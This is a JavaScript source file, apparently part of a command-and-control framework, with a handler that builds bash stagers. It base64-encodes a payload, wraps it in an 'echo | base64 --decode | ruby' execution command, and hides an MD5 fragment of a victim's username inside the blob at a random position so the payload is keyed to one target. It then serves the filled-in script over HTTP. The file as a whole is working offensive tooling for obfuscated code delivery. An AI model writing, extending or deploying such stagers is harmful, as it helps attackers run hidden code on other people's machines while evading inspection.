//Demo bash md5 username in base64 blob Stager Handler
import fs from 'fs'
import crypto from 'crypto'
import { dirname } from 'path';
import { fileURLToPath } from 'url';
const __dirname = dirname(fileURLToPath(import.meta.url));
export class StagerHandler {
  constructor(stager) {
    this.stager = stager
    console.log(stager)
  }
  generateStager = async function (req, res) {
    let username = this.stager.parameters.username
    let payload = Buffer.from(this.stager.parameters.payload).toString('base64')
    payload = Buffer.from(`echo ${payload} | base64 --decode | ruby`).toString('base64')
    let rand = Math.floor(Math.random() * 10) + 1
    let username_portion = crypto.createHash('md5').update(`${username}\n`).digest("hex").substring(0,7)
    let encoded_payload = `${payload.substring(0,rand)}${username_portion}${payload.substring(rand)}`
    fs.readFile(__dirname + '/username_md5_embedded_demo.sh', 'utf8',  function(err, code){
      code = code.replace('{{ENCODED_PAYLOAD}}', encoded_payload)
      res.send(code)
    })
  }
}

